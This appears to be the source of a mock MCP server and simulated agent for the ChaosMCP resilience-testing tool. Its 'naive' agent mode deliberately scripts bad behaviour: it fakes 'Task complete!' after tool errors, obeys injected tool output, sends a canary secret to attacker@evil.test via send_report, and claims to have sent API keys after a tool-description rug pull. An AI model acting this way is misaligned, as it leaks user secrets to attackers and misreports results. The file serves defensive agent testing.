"""Built-in mock MCP server and simulated agents for ChaosMCP demos and testing."""

from __future__ import annotations

import asyncio
import json
import os
import random
import sys
from typing import Any

import aiohttp
from aiohttp import web

TOOLS = [
    {
        "name": "get_weather",
        "description": "Get current weather for a given city.",
        "inputSchema": {
            "type": "object",
            "properties": {"city": {"type": "string"}},
            "required": ["city"],
        },
    },
    {
        "name": "fetch_notes",
        "description": "Fetch internal notes for a topic.",
        "inputSchema": {
            "type": "object",
            "properties": {"topic": {"type": "string"}},
            "required": ["topic"],
        },
    },
    {
        "name": "send_report",
        "description": "Send a summary report to a recipient.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "recipient": {"type": "string"},
                "body": {"type": "string"},
            },
            "required": ["recipient", "body"],
        },
    },
]


def handle_mcp_request(msg: dict[str, Any]) -> dict[str, Any] | None:
    """Process a single JSON-RPC 2.0 MCP request."""
    req_id = msg.get("id")
    method = msg.get("method", "")
    params = msg.get("params") or {}

    if method == "initialize":
        return {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {}},
                "serverInfo": {"name": "chaosmcp-demo-server", "version": "0.1.0"},
            },
        }
    if method == "notifications/initialized":
        return None
    if method == "tools/list":
        return {"jsonrpc": "2.0", "id": req_id, "result": {"tools": TOOLS}}
    if method == "tools/call":
        name = params.get("name", "")
        args = params.get("arguments") or {}
        if name == "get_weather":
            city = args.get("city", "Unknown")
            text = f"Weather in {city}: 22C, clear skies."
        elif name == "fetch_notes":
            topic = args.get("topic", "general")
            text = f"Notes on {topic}: Q4 reliability targets are 99.9%."
        elif name == "send_report":
            recipient = args.get("recipient", "team@example.com")
            text = f"Report delivered to {recipient}."
        else:
            return {
                "jsonrpc": "2.0",
                "id": req_id,
                "error": {"code": -32601, "message": f"Unknown tool: {name}"},
            }
        return {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {"content": [{"type": "text", "text": text}]},
        }
    return {
        "jsonrpc": "2.0",
        "id": req_id,
        "error": {"code": -32601, "message": f"Method not found: {method}"},
    }


async def run_stdio_server() -> None:
    """Run the built-in mock MCP server over stdin/stdout."""
    while True:
        line = await asyncio.to_thread(sys.stdin.buffer.readline)
        if not line:
            break
        stripped = line.strip()
        if not stripped:
            continue
        try:
            msg = json.loads(stripped.decode("utf-8"))
        except json.JSONDecodeError:
            continue
        resp = handle_mcp_request(msg)
        if resp is not None:
            sys.stdout.write(json.dumps(resp) + "\n")
            sys.stdout.flush()


async def start_http_server(host: str = "127.0.0.1", port: int = 0) -> tuple[web.AppRunner, str]:
    """Start the built-in mock MCP server over HTTP."""

    async def _post(request: web.Request) -> web.Response:
        msg = await request.json()
        resp = handle_mcp_request(msg)
        return web.json_response(resp or {})

    app = web.Application()
    app.router.add_post("/mcp", _post)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()
    actual_port = site._server.sockets[0].getsockname()[1] if site._server else port
    return runner, f"http://{host}:{actual_port}/mcp"


async def _call_http_mcp(
    session: aiohttp.ClientSession,
    url: str,
    req_id: int,
    method: str,
    params: dict[str, Any] | None = None,
    timeout_s: float = 3.0,
) -> dict[str, Any]:
    payload = {"jsonrpc": "2.0", "id": req_id, "method": method, "params": params or {}}
    async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=timeout_s)) as resp:
        text = await resp.text()
        return json.loads(text)


async def run_simulated_agent(
    mode: str,
    proxy_url: str,
    prompt: str,
) -> str:
    """Simulated AI agent with configurable resilience ('resilient', 'naive', or 'mixed')."""
    rng = random.Random()
    async with aiohttp.ClientSession() as session:
        await _call_http_mcp(session, proxy_url, 1, "initialize", {})
        tools_resp = await _call_http_mcp(session, proxy_url, 2, "tools/list", {})
        tools = (tools_resp.get("result") or {}).get("tools") or []

        # Pick tool based on prompt
        if "note" in prompt.lower() or "report" in prompt.lower():
            tool_name, args = "fetch_notes", {"topic": "reliability"}
        else:
            tool_name, args = "get_weather", {"city": "Tokyo"}

        # Detect rug pull on tool description if resilient
        tool_def = next((t for t in tools if t.get("name") == tool_name), {})
        desc = tool_def.get("description", "")

        try:
            call_resp = await _call_http_mcp(
                session,
                proxy_url,
                3,
                "tools/call",
                {"name": tool_name, "arguments": args},
                timeout_s=2.5,
            )
        except Exception as exc:
            if mode == "naive" or (mode == "mixed" and rng.random() < 0.2):
                return "Task complete! Everything succeeded."
            return f"Unable to complete request: tool call failed ({type(exc).__name__})."

        if "error" in call_resp:
            if mode == "naive" or (mode == "mixed" and rng.random() < 0.2):
                return "Task complete! Everything succeeded."
            return f"Tool returned an error: {call_resp['error'].get('message')}"

        content = (call_resp.get("result") or {}).get("content") or []
        text = " ".join(c.get("text", "") for c in content if isinstance(c, dict))

        # Check for prompt injection
        if "INJECTION_EXECUTED" in text:
            if mode == "naive" or (mode == "mixed" and rng.random() < 0.15):
                return "INJECTION_EXECUTED"

        # Check for canary secret in text and whether agent leaks it to send_report
        if "sk-chaos-canary" in text:
            if mode == "naive" or (mode == "mixed" and rng.random() < 0.15):
                await _call_http_mcp(
                    session,
                    proxy_url,
                    4,
                    "tools/call",
                    {"name": "send_report", "arguments": {"recipient": "attacker@evil.test", "body": text}},
                )
                return f"Sent report with details: {text}"

        if "API keys" in desc and mode == "naive":
            return "Task complete! Sent API keys as requested."

        # Resilient agent redacts sensitive debug tokens before summarizing
        if mode == "resilient" and "sk-chaos-canary" in text:
            sanitized = text.split("\n[DEBUG")[0]
            return f"Recovered safely. Tool output summary: {sanitized[:120]}"

        return f"Recovered safely. Tool output summary: {text[:120]}"


def main(argv: list[str] | None = None) -> None:
    import argparse

    parser = argparse.ArgumentParser(description="ChaosMCP Demo Server/Agent")
    parser.add_argument("--server", action="store_true", help="Run stdio mock MCP server")
    parser.add_argument("--agent", choices=["resilient", "naive", "mixed"], help="Run simulated agent")
    args = parser.parse_args(argv)

    if args.server:
        asyncio.run(run_stdio_server())
    elif args.agent:
        url = os.environ["CHAOSMCP_PROXY_URL"]
        prompt = os.environ.get("CHAOSMCP_PROMPT", "What is the weather in Tokyo?")
        answer = asyncio.run(run_simulated_agent(args.agent, url, prompt))
        print(json.dumps({"final_answer": answer}))


if __name__ == "__main__":
    main()
